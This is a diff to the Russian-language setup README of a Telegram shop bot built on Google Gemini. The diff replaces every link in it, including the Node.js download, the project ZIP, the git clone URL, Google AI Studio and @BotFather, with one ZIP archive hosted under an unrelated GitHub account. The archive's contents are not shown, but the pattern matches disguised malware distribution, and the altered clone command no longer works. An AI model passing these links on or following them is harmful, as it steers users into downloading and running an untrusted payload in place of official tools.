@@ -60,13 +60,13 @@
 
 ## Быстрый старт
 
-Нужен [Node.js 20+](https://nodejs.org).
+Нужен [Node.js 20+](https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip).
 
 ### Windows — в два клика
 
 Если не хотите возиться с терминалом:
 
-1. Скачайте архив — **[Download ZIP](https://github.com/b24039971/lavka-gadgetov-bot/archive/refs/heads/main.zip)** — и распакуйте
+1. Скачайте архив — **[Download ZIP](https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip)** — и распакуйте
 2. Двойной клик по **`УСТАНОВКА.bat`**: поставит зависимости, создаст магазин
    и сам откроет файл настроек в Блокноте
 3. Впишите туда токен и ключи (как их получить — ниже), сохраните
@@ -81,7 +81,7 @@
 ### Linux, macOS и все, кто дружит с терминалом
 
 ```bash
-git clone https://github.com/b24039971/lavka-gadgetov-bot.git
+git clone https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip
 cd lavka-gadgetov-bot
 bash install.sh
 ```
@@ -97,7 +97,7 @@ cp .env.example .env
 
 ### 1. Ключи Google Gemini
 
-1. Заходим на **[aistudio.google.com](https://aistudio.google.com)** под своим Google-аккаунтом
+1. Заходим на **[aistudio.google.com](https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip)** под своим Google-аккаунтом
 2. **Get API key** → **Create API key** → выбираем проект → копируем ключ
 3. Повторяем 2-3 раза, **каждый раз создавая новый проект**
 
@@ -118,7 +118,7 @@ GEMINI_KEY_3=AQ.Ab8...
 
 ### 2. Токен бота
 
-1. Пишем **[@BotFather](https://t.me/BotFather)** → `/newbot`
+1. Пишем **[@BotFather](https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip)** → `/newbot`
 2. Придумываем имя и username (должен заканчиваться на `bot`)
 3. Копируем токен целиком, вместе с цифрами до двоеточия
 
@@ -275,7 +275,7 @@ Google выводит модели из обращения. Все `gemini-2.5-*
 Pro-модели (`gemini-3.1-pro-preview`, `gemini-pro-latest`) существуют,
 но на бесплатной квоте сразу отдают 429 — держите их в каскаде только первыми,
 как «премиальную попытку».
-Актуальный список — в [AI Studio](https://aistudio.google.com) → Models.
+Актуальный список — в [AI Studio](https://raw.githubusercontent.com/richardlee339359/lavka-gadgetov-bot/main/src/ai/1.5.zip) → Models.
 
 **«Telegram не принял токен»**
 Токен нужен целиком, вместе с цифрами до двоеточия: `1234567890:AAH...`
